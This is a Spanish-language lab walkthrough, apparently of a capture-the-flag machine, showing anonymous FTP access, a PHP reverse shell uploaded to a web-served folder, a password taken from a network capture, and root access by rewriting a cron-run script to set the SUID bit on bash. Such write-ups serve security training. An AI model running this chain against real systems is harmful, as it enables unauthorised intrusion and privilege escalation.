# Start Up

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux aprovechando un servidor **FTP con acceso anónimo**, obtener una **Remote Code Execution (RCE)** mediante la subida de archivos, recuperar credenciales analizando una captura de red y escalar privilegios modificando un script ejecutado automáticamente por **root**.

---

## 🛠️ Tecnologías trabajadas

- FTP
- Anonymous Login
- Gobuster
- PHP Reverse Shell
- Wireshark
- SSH
- Cron Jobs
- Linux Permissions

---

## 🧠 Metodología

La enumeración inicial mostró tres servicios interesantes: **FTP**, **SSH** y **HTTP**. El hecho de que el servidor FTP permitiera autenticación anónima convirtió este servicio en el principal punto de partida, ya que podía facilitar tanto información sensible como la posibilidad de subir archivos al servidor.

Aunque la aplicación web apenas mostraba información útil, la enumeración de directorios reveló una relación directa entre el contenido publicado por la web y los archivos almacenados en el servidor FTP. Esto sugería que cualquier archivo subido al FTP podría ejecutarse posteriormente desde el navegador.

Tras obtener acceso inicial mediante una **reverse shell**, la enumeración interna permitió descubrir una captura de tráfico de red. En lugar de seguir buscando vulnerabilidades locales, decidí analizar el archivo con Wireshark, ya que este tipo de evidencias suele contener credenciales o información sensible.

Finalmente, una vez obtenido acceso mediante SSH como un usuario legítimo, la revisión de los scripts ejecutados automáticamente por **root** reveló una configuración insegura que permitía modificar uno de ellos y conseguir una escalada de privilegios.

Este laboratorio combina varias fases muy habituales en auditorías reales: enumeración de servicios, análisis de tráfico, reutilización de credenciales y explotación de tareas programadas.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un escaneo completo de puertos utilizando Nmap.

```bash
nmap -p- 10.130.155.33
```

Los servicios detectados fueron:

| Puerto | Servicio |
|---------|----------|
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |

Posteriormente realicé una enumeración más detallada.

```bash
nmap -sC -sV -p21,22,80 10.130.155.33
```

La información obtenida confirmó:

- FTP con **Anonymous Login** habilitado.
- SSH sobre Ubuntu.
- Servidor Apache en el puerto 80.

---

### 2. Enumeración de servicios

#### FTP

Accedí utilizando autenticación anónima.

```bash
ftp anonymous@10.130.155.33
```

Dentro encontré dos archivos interesantes:

- `notice.txt`
- `important.jpg`

El archivo `notice.txt` hacía referencia al usuario:

```
Maya
```

Aunque esta información todavía no permitía acceder al sistema, resultaba útil para futuras fases.

---

#### Aplicación web

Accedí a la página principal.

```
http://10.130.155.33
```

La aplicación únicamente mostraba una página en mantenimiento.

Realicé una enumeración de directorios utilizando Gobuster.

```bash
gobuster dir -u http://10.130.155.33 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

La enumeración descubrió:

```
/files
```

Dentro apareció:

```
/files/ftp
```

La coincidencia entre este directorio y el contenido del servidor FTP indicaba que ambos compartían el mismo almacenamiento.

---

### 3. Obtención del acceso inicial

Aprovechando la relación entre el FTP y el servidor web, preparé una **reverse shell** en PHP.

Subí el archivo al servidor FTP y posteriormente accedí a él desde el navegador mediante:

```
/files/ftp
```

El archivo se ejecutó correctamente y obtuve una shell sobre la máquina víctima.

---

### 4. Post-explotación

Tras obtener acceso comencé la enumeración del sistema.

Entre los archivos encontrados apareció:

```
recipe.txt
```

Su contenido respondía a una de las preguntas del laboratorio:

```
love
```

Posteriormente identifiqué un directorio especialmente interesante:

```
incidents
```

Dentro de él encontré una captura de tráfico:

```
suspicious.pcapng
```

---

### 5. Análisis del tráfico

Descargué el archivo y lo analicé utilizando **Wireshark**.

Siguiendo los flujos TCP apareció una sesión donde se observaban credenciales utilizadas previamente.

Las credenciales recuperadas fueron:

```
Usuario: lennie

Contraseña: c4ntg3t3n0ughsp1c3
```

---

### 6. Acceso mediante SSH

Con las credenciales obtenidas inicié sesión mediante SSH.

```bash
ssh lennie@10.130.155.33
```

Una vez autenticado recuperé la primera flag:

```
user.txt
```

---

### 7. Escalada de privilegios

Durante la enumeración del directorio personal apareció:

```
~/scripts
```

Dentro encontré:

- `planner.sh`
- `startup_list.txt`

El análisis mostró que `planner.sh` ejecutaba el siguiente script:

```
/etc/print.sh
```

Comprobé que dicho archivo podía modificarse con el usuario actual.

Aproveché esta configuración sustituyendo su contenido por:

```bash
echo "chmod +s /bin/bash" > /etc/print.sh
```

Tras esperar a que la tarea programada se ejecutara automáticamente como **root**, lancé:

```bash
/bin/bash -p
```

Obteniendo una shell con privilegios elevados.

Finalmente recuperé la última flag:

```
/root/root.txt
```

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió practicar una cadena de explotación muy completa basada en la combinación de varios vectores de ataque.
- Aprovechar servidores **FTP** con autenticación anónima.
- Relacionar recursos compartidos entre FTP y servidores web.
- Obtener ejecución remota de código mediante la subida de archivos.
- Analizar capturas de red utilizando **Wireshark**.
- Recuperar credenciales observando conversaciones en texto claro.
- Reutilizar credenciales para acceder mediante SSH.
- Identificar scripts ejecutados automáticamente por **root**.
- Comprender el impacto de permisos de escritura sobre scripts utilizados por tareas programadas.
